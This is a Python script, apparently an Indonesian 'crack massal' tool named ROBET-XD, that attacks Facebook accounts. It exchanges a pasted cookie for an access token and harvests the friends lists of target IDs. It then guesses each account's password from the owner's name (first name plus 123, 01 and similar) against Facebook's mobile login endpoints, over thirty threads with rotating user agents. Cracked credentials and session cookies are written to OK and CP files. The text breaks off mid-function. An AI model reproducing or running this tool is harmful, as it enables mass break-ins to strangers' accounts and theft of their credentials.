import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
from datetime import datetime    
pretty.install()
CON=sol()
ugen=[]
ugen2=[]
cokbrut=[]
ses=requests.Session()
princp=[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
#---[USER-AGENT]---#
for xd in range(10000) :
	a='Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-P280W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4590.125 Mobile Safari/537.36',
	b=random.randrange(3, 14) 
	c='zh-cn; PEUMOO Build/TP1A.220905.001 )N367Y)'
	d=random.randrange(100, 700) 
	e='Applewebkit/537.36 (KHTML, Like Gecko) Version/4.0 Chrome/90.0.4430.6190.0.4465.97'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.36 HeyTapBrowser/40.8.2.9'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-P280W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4590.125 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.48',
	b=random.randrange(3, 14) 
	c='zh-cn; PEUMOO Build/TP1A.220905.001 )S156Q)'
	d=random.randrange(100, 700) 
	e='Applewebkit/537.36 (KHTML, Like Gecko) Version/4.0 Chrome/90.0.4430.6194.0.4372.86'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.36 HeyTapBrowser/40.8.2.9'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-P280W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4590.125 Mobile Safari/537.36',
	b=random.randrange(3, 14) 
	c='zh-cn; PEUMOO Build/TP1A.220905.001 )G690W)'
	d=random.randrange(100, 700) 
	e='Applewebkit/537.36 (KHTML, Like Gecko) Version/4.0 Chrome/90.0.4430.6190.0.4230.68'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.36 HeyTapBrowser/40.8.2.9'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]","Mozilla/5.0 (Linux; U; Android 10;  en-us; GT-P280W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.4590.125 Mobile Safari/537.36',
	b=random.randrange(3, 14) 
	c='Mozilla/5.0 (Linux; U; Android 11; 10; PEUMOO Build/TP1A.220905.001 )K486U)'
	d=random.randrange(100, 700) 
	e='Applewebkit/537.36 (KHTML, Like Gecko) Version/4.0 Chrome/90.0.4430.6186.0.4255.94'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.36 HeyTapBrowser/40.8.2.9'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 14) 
	c='K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(100, 700) 
	e='0'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.35'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 14) 
	c='SM-T720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(100, 700) 
	e='0'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Mobile Safari/537.35'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
	
	a='Mozilla/5.0 (Linux; Android'
	b=random.randrange(3, 14) 
	c='Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	d=random.randrange(100, 700) 
	e='0'
	f=random.randrange(100, 6900) 
	h=random.randrange(100, 700) 
	i='Safari/537.36 OPR/97.0.3366.116'
	raf=f'{a} {b}; {c}{d}.{e}.{f}.{h} {i}'
	ugen.append(raf) 
#---warna---#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#---[BANNER]---#
def banner():
	print(f'''==========================================\n ██████╗░░█████╗░██████╗░███████╗████████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝
██████╔╝██║░░██║██████╦╝█████╗░░░░░██║░░░
██╔══██╗██║░░██║██╔══██╗██╔══╝░░░░░██║░░░
██║░░██║╚█████╔╝██████╦╝███████╗░░░██║░░░
╚═╝░░╚═╝░╚════╝░╚═════╝░╚══════╝░░░╚═╝░░░
	ROBET-XD\n==========================================\n''') 

#---[DATE TIME]---#
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.now().day
bln = dic[(str(datetime.now().month))]
thn = datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

#---[TIME]---#
def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "good morning"
	elif 12 <= hours < 15:timenow = "good afternoon"
	elif 15 <= hours < 18:timenow = "good evening"
	else:timenow = "good night"
	return timenow
#---[PEMBANTU]---#
def clear():
	os.system('clear')

def back():
	login()

#---[LOGIN---#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		clear()
		banner()
		cetak(nel('\tSARAN EXTENSION : [green]COOKIEDOUGH[white]'))
		ses = requests.Session()
		cok = input('\nMasukan Cookie : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
			fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
			jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
				fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
				jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
				scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
				display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
				user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
				logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
				auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
				encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
				return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
					tokenw = open(".token.txt", "w").write(access_token)
					cokiew = open(".cok.txt", "w").write(cok)
					print('\nlogin berhasil jalankan lagi scnya')
				else:
					exit('\n[+] login gagal')
		
	except Exception as e:
		print('\n[¢]  Cookies Invalid Bro')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()


#----[MENU UTAMA]---#
def menu(my_name,my_id):
	try:
		token=open('.token.txt','r').read()
		cok=open('.cok.txt','r').read()
	except IOError:
		print('[x] COOKIE KADALUARSA')
		time.sleep(2)
		login_lagi334()
	clear()
	cetak(nel(waktu(),width=48,title='UCAPAN SELAMAT',style='dim')) 
	banner()
	print(f'[1] CRACK PUBLIK/MASSAL')
	print(f'[2] EXIT') 
	RAF=input('[√] PILIH : ')
	if RAF in ['1']:
		crack_massal()
	elif RAF in ['2']:
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print('[√] BERHASIL KELUAR')
		exit()
	else:
		print('[x] PILIH YANG BENAR')
		back()

#---[dump massal---#
def crack_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		ply=int(input('\n[•] MAU BERAPA TARGET?: ')) 
	except ValueError:
		print('[x] KETIK YANG BENER KAK')
		back()
	if ply<1 or ply>100:
		print('[x] GAGAL DUMP')
		back()
	ses=requests.Session()
	xy = 0
	for ngen in range(ply):
		xy+=1
		raf=input('[√] MASUKKAN ID YANG KE '+str(xy)+':') 
		uid.append(raf)
	for mkz in uid:
		try:
			kontol = ses.get('https://graph.facebook.com/v2.0/'+mkz+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for cok in kontol['friends']['data']:
				try:
					laso=(cok['id']+'|'+cok['name'])
					if laso in id:pass 
					else:id.append(laso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('[x] SINYAL KURANG BAGUS')
			back()
	try:
		print(f'[•] TOTAL ID '+str(len(id))+'\n')
		atur()
	except requests.exceptions.ConnectionError:
		print('[x] SINYAL KURANG BAGUS')
		back()
	except (KeyError,IOError):
		print('[x] ID TARGET TIDAK PUBLIK')
		time.sleep(2)
		back()
#---[PENGATURAN]---#

#----ppp---#
def atur():
	for ngentod in id:
		xc = random.randint(0,len(id2))
		id2.insert(xc,ngentod)
	katakata() 

def katakata():
    print('[1]. VALIDATE V1\n[2]. VALIDATE V2') 
    plyy=input('[*] PILIH : ') 
    if plyy in ['1']:
        method.append('mo') 
    elif plyy in ['2']:
        method.append('free')
    else:
        print('pilih yang benar') 
        exit() 
    pww() 
    
#---[BAGIAN WORDLIST]---#
def pww():
	print('')
	print(f'[•] Mainkan Mode ✈️ Setiap 1k Idz\n')
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'06')
					pwv.append(frs+'07')
					pwv.append(frs+'08')
					pwv.append(frs+'09')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'123456')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'03')
					pwv.append(frs+'04')
					pwv.append(frs+'05')
					pwv.append(frs+'06')
					pwv.append(frs+'07')
					pwv.append(frs+'08')
					pwv.append(frs+'09')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'123456')
					pwv.append(frs+'12345')
					pwv.append(frs+'321')
					pwv.append('bantaeng') 
					pwv.append('bulukumba') 
					pwv.append(frs+'sayang') 
					pwv.append(frs+'cantik') 
		#	if 'ya' in pwpluss:
				#for xpwd in pwnya:
					#pwv.append(xpwd)
		#	else:pass
			if 'free' in method:
				pool.submit(crack,idf,pwv)
			elif 'mo' in method:
				pool.submit(crackfree,idf,pwv)
			#elif 'touch' in method:
	#			pool.submit(crack,idf,pwv)
		#	elif 'mbasic' in method:
				#pool.submit(crack,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	#cetak(nel('\t[cyan]>>[green] Crack Selesai wey, syukuri aja hasil maling soalnya klo mau ijo print aja xix[cyan] <<[white] '))
	print(f'[•] OK : %s '%(ok))
	print(f'[•] CP : %s '%(cp))
	print('')
	print('>> Lanjut Crack Kembali ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t❤ Good Bye Dadaahh ❤')
		time.sleep(2)
		exit()
#---[MOBILE&FREE]---#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r¥{idf} {P}[{P}{loop}{P}/{P}{len(id)}{P}]—{P}[{P}{ok}{P}]—{P}[{cp}{x}]—[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]           "),
	sys.stdout.flush()
#	ganrang = open('/sdcard/raf.txt','r').read().splitlines() 
	ua = random.choice(ugen) 
	#ua2 = random.choice(ug4en2)
	ses = requests.Session()
	for pw in pwv:
		try:
			headers = {
				'Host': 'm.facebook.com',
				'content-length': '1028',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'origin': 'https://m.facebook.com',
		#		'dnt': '1',
				'upgrade-insecure-requests': '1',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'referer': f'https://mbasic.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_2o6bz3k9%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0174e559-53c1-478b-ad4f-c6e7b3c861bc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_2o6bz3k9%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			}
			urls = sop(ses.get(f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_2o6bz3k9%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D0174e559-53c1-478b-ad4f-c6e7b3c861bc%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_2o6bz3k9%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text, "html.parser")
			form = urls.find('form', {'method':'post'})
			data = {
				'lsd': re.search('name="lsd" type="hidden" value="(.*?)"',str(form)).group(1),
				'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"',str(form)).group(1),
				'uid': idf,
				'next': 'https://m.facebook.com/v2.9/dialog/oauth/?platform=facebook&client_id=1862952583919182&response_type=token&redirect_uri=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F&state=%7B%22client_id%22%3A%221862952583919182%22%2C%22network%22%3A%22facebook%22%2C%22display%22%3A%22popup%22%2C%22callback%22%3A%22_hellojs_2o6bz3k9%22%2C%22state%22%3A%22%22%2C%22redirect_uri%22%3A%22https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%22%2C%22scope%22%3A%22basic%22%7D&scope=public_profile&auth_type=reauthenticate&display=popup&ret=login&fbapp_pres=0&logger_id=0174e559-53c1-478b-ad4f-c6e7b3c861bc&tp=unspecified',
				'flow': 'login_no_pin',
				'pass': pw,
			}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=data,headers=headers)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r[CP] 💔{k} {idf}|{pw}                \n<=> {ua}{P}\n')    
#				os.popen('play-audio /sdcard/cp.mp3')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r[OK] ❤{h} {idf}|{pw}             \n{kuki}  {P}    \n')
#				os.popen('play-audio /sdcard/ok.mp3')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#---free---#
def crackfree(idf,pwv):
	bo = random.choice([m,k,h,b,u,x])
	global loop,ok,cp
	sys.stdout.write(f"\r✈️ {idf} {P}[{P}{loop}{P}/{P}{len(id)}{P}]—{P}[{P}{ok}{P}]—{P}[{cp}{x}]—[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]           "),
	sys.stdout.flush() 
	#songkeng = open('/sdcard/raf.txt','r').read().splitlines() 
	ua = random.choice(ugen) 
	ses = requests.Session()
	for pw in pwv:
		try:
			headers = {
				'Host': 'm.facebook.com',
				'content-length': '994',
				'cache-control': 'max-age=0',
				'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
				'strict-transport-security': 'max-age=15552000; preload', 
				'x-fb-debug': '10KnfUvNV0gG2CQRmC+DX00kQuXfqbVpg6Hind6g3P+uARNrQkWEyiPZ1NIq8F43BtbMLagKl57dunvK/9iodQ==', 
				'sec-ch-ua-mobile': '?1',
				'sec-ch-ua-platform': '"Android"',
				'upgrade-insecure-requests': '1', 
				'origin': 'https://free.facebook.com',
				'content-type': 'application/x-www-form-urlencoded',
				'user-agent': ua,
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'navigate',
				'sec-fetch-user': '?1',
				'sec-fetch-dest': 'document',
				'referer': f'https://free.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https://free.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1685898230661%26e2e%3D%257B%2522init%2522%253A1685898230661%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3Dab5787e4-1930-4a43-b083-079caa897f72%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd43e9f47-9ed1-45ab-b92a-3597ae93a176%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr', 
				'accept-encoding': 'gzip, deflate, br',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
			}
			urls = sop(ses.get(f'https://m.facebook.com/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https://free.facebook.com/login.php?skip_api_login=1&api_key=2036793259884297&kid_directed_site=0&app_id=2036793259884297&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D2036793259884297%26cbt%3D1685898230661%26e2e%3D%257B%2522init%2522%253A1685898230661%257D%26ies%3D1%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3Dab5787e4-1930-4a43-b083-079caa897f72%26scope%3Dopenid%252Cpublic_profile%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25227pefkbumdvkfet5cqt6k%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.dts.freefireth%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd43e9f47-9ed1-45ab-b92a-3597ae93a176%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.dts.freefireth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522d43e9f47-9ed1-45ab-b92a-3597ae93a176%2522%252C%25223_method%2522%253A%2522custom_tab%